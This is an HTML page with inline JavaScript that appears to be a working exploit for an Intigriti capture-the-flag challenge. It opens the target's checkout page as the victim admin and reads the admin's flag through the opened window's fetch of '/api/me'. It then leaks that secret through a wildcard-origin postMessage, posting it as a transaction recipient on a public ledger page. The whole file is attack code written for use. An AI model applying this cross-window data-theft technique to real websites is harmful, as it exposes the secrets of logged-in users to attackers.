<!DOCTYPE html>
<html>
<body>
    <script>
        // 1. Open the Buy page as the Admin
        const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1,000,000");

        setTimeout(() => {
            // 2. Fetch the flag first (as the Admin)
            win.fetch('/api/me')
                .then(r => r.json())
                .then(data => {
                    const flag = data.flag;
                    
                    // 3. Now "Follow the trail"
                    // We send a transaction where the "toAddress" IS the flag!
                    // This puts the flag directly into the public Market Watch ledger.
                    win.postMessage({
                        type: 'submitTransaction',
                        transaction: {
                            toAddress: flag, // The flag becomes the recipient address
                            currency: '1337COIN',
                            amount: 1
                        }
                    }, '*');
                });
                
            // 4. Redirect to Market Watch to see the "Trail" (and the flag)
            setTimeout(() => {
                win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
            }, 3000);
        }, 5000);
    </script>
</body>
</html>
